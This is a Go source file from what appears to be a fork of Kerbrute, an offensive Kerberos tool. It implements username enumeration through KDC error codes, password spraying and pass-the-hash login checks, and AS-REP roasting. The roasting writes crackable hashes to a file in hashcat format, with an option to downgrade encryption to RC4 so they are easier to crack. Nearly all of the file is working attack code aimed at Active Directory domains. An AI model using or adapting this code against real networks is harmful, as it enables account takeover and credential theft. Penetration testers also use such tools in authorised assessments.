package session

import (
	"fmt"
	"html/template"
	"log"
	"os"
	"strings"

	"github.com/chin-tech/kerbrute/util"

	"github.com/chin-tech/gokrb5/v8/iana/errorcode"

	kclient "github.com/chin-tech/gokrb5/v8/client"
	kconfig "github.com/chin-tech/gokrb5/v8/config"
	"github.com/chin-tech/gokrb5/v8/messages"
)

const krb5ConfigTemplateDNS = `[libdefaults]
dns_lookup_kdc = true
default_realm = {{.Realm}}
`

const krb5ConfigTemplateKDC = `[libdefaults]
default_realm = {{.Realm}}
[realms]
{{.Realm}} = {
	kdc = {{.DomainController}}
	admin_server = {{.DomainController}}
}
`

type KerbruteSession struct {
	Domain string
	Realm  string
	Kdcs   map[int]string
	// ConfigString string
	Config   *kconfig.Config
	Verbose  bool
	SafeMode bool
	HashFile *os.File
	Logger   *util.Logger
}

type KerbruteSessionOptions struct {
	Domain           string
	DomainController string
	Verbose          bool
	SafeMode         bool
	Downgrade        bool
	HashFilename     string
	logger           *util.Logger
}

func LoadKrbConfig(kopts KerbruteSessionOptions) *kconfig.Config {
	path := os.Getenv("KRB5_CONFIG")
	if path == "" && kopts.Domain == "" {
		path = "/etc/krb5.conf"
	}
	cfg, err := kconfig.Load(path)
	if err != nil || kopts.Domain != "" {
		if kopts.Domain == "" {
			log.Fatalf("[!] Empty KRB5_CONFIG and No [-d] domain specified")
		}
		if kopts.DomainController == "" {
			log.Fatalf("[!] Empty KRB5_CONFIG and No [--dc] Domain Controller found")
		}
		realm := strings.ToUpper(kopts.Domain)
		cfgString := buildKrb5Template(realm, kopts.DomainController)
		cfg, err := kconfig.NewFromString(cfgString)
		if err != nil {
			log.Fatalf("[!] Failed creating krb5 templ")
		}
		return cfg

	}
	return cfg
}

func NewKerbruteSession(options KerbruteSessionOptions) (k KerbruteSession, err error) {
	// if options.Domain == "" {
	// 	return k, fmt.Errorf("domain must not be empty")
	// }
	if options.logger == nil {
		logger := util.NewLogger(options.Verbose, "")
		options.logger = &logger
	}
	var hashFile *os.File
	if options.HashFilename != "" {
		hashFile, err = os.OpenFile(options.HashFilename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			return k, err
		}
		options.logger.Log.Infof("Saving any captured hashes to %s", hashFile.Name())
		if !options.Downgrade {
			options.logger.Log.Warningf("You are capturing AS-REPs, but not downgrading encryption. You probably want to downgrade to arcfour-hmac-md5 (--downgrade) to crack them with a user's password instead of AES keys")
		}
	}

	cfg := LoadKrbConfig(options)
	realm := cfg.LibDefaults.DefaultRealm
	var domain string
	if options.Domain != "" {
		domain = strings.ToLower(cfg.LibDefaults.DefaultRealm)
	} else {
		domain = options.Domain
	}
	// realm := strings.ToUpper(options.Domain)
	// configstring := buildKrb5Template(realm, options.DomainController)
	// cfg, err := kconfig.NewFromString(configstring)
	if options.Downgrade {
		cfg.LibDefaults.DefaultTktEnctypeIDs = []int32{23} // downgrade to arcfour-hmac-md5 for crackable AS-REPs
		options.logger.Log.Info("Using downgraded encryption: arcfour-hmac-md5")
	}
	if err != nil {
		panic(err)
	}
	_, kdcs, err := cfg.GetKDCs(realm, false)
	if err != nil {
		err = fmt.Errorf("Couldn't find any KDCs for realm %s. Please specify a Domain Controller", realm)
	}
	k = KerbruteSession{
		Domain:   domain,
		Realm:    realm,
		Kdcs:     kdcs,
		Config:   cfg,
		Verbose:  options.Verbose,
		SafeMode: options.SafeMode,
		HashFile: hashFile,
		Logger:   options.logger,
		// ConfigString: configstring,
	}
	return k, err

}

func buildKrb5Template(realm, domainController string) string {
	data := map[string]interface{}{
		"Realm":            realm,
		"DomainController": domainController,
	}
	var kTemplate string
	if domainController == "" {
		kTemplate = krb5ConfigTemplateDNS
	} else {
		kTemplate = krb5ConfigTemplateKDC
	}
	t := template.Must(template.New("krb5ConfigString").Parse(kTemplate))
	builder := &strings.Builder{}
	if err := t.Execute(builder, data); err != nil {
		panic(err)
	}
	return builder.String()
}

func (k KerbruteSession) TestLogin(username, password string) (bool, error) {

	Client := kclient.NewWithPassword(username, k.Realm, password, k.Config, kclient.DisablePAFXFAST(true), kclient.AssumePreAuthentication(true))
	defer Client.Destroy()
	if ok, err := Client.IsConfigured(); !ok {
		return false, err
	}
	err := Client.Login()
	if err == nil {
		return true, err
	}
	return k.TestLoginError(err)
}

func (k *KerbruteSession) checkLogin(client *kclient.Client) (bool, error) {
	defer client.Destroy()

	if ok, err := client.IsConfigured(); !ok {
		return false, err
	}

	err := client.Login()
	if err == nil {
		return true, err
	}
	// s, err := k.TestLoginError(err)

	return k.TestLoginError(err)

}

func (k KerbruteSession) TestCredential(username string, securecreds util.SecureCredential) (bool, error) {
	hashBytes, err := securecreds.HashBytes()
	// fmt.Printf("HashBytes Value: %v | Error: %v \n", hashBytes, err)
	if err != nil {
		return false, err
	}
	if hashBytes == nil { // Password is the actual option
		// fmt.Printf("Testing: %q\n", securecreds.Cred)
		c := kclient.NewWithPassword(username, k.Realm, securecreds.Cred, k.Config, kclient.DisablePAFXFAST(true), kclient.AssumePreAuthentication(false))
		// fmt.Printf("%v\n", c)
		return k.checkLogin(c)

	} else {
		c := kclient.NewWithHash(username, k.Realm, hashBytes, k.Config, kclient.DisablePAFXFAST(true), kclient.AssumePreAuthentication(false))
		return k.checkLogin(c)

	}

}

func (k KerbruteSession) TestUsername(username string) (bool, error) {
	// client here does NOT assume preauthentication (as opposed to the one in TestLogin)

	cl := kclient.NewWithPassword(username, k.Realm, "foobar", k.Config, kclient.DisablePAFXFAST(true))

	req, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
	if err != nil {
		fmt.Printf(err.Error())
	}
	b, err := req.Marshal()
	if err != nil {
		return false, err
	}
	rb, err := cl.SendToKDC(b, k.Realm)

	if err == nil {
		// If no error, we actually got an AS REP, meaning user does not have pre-auth required
		var ASRep messages.ASRep
		err = ASRep.Unmarshal(rb)
		if err != nil {
			// something went wrong, it's not a valid response
			return false, err
		}
		k.DumpASRepHash(ASRep)
		return true, nil
	}
	e, ok := err.(messages.KRBError)
	if !ok {
		return false, err
	}
	switch e.ErrorCode {
	case errorcode.KDC_ERR_PREAUTH_REQUIRED:
		return true, nil
	default:
		return false, err

	}
}

func (k KerbruteSession) DumpASRepHash(asrep messages.ASRep) {
	hash, err := util.ASRepToHashcat(asrep)
	if err != nil {
		k.Logger.Log.Debugf("[!] Got encrypted TGT for %s, but couldn't convert to hash: %s", asrep.CName.PrincipalNameString(), err.Error())
		return
	}
	k.Logger.Log.Noticef("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", asrep.CName.PrincipalNameString(), hash)
	if k.HashFile != nil {
		_, err := k.HashFile.WriteString(fmt.Sprintf("%s\n", hash))
		if err != nil {
			k.Logger.Log.Errorf("[!] Error writing hash to file: %s", err.Error())
		}
	}
}
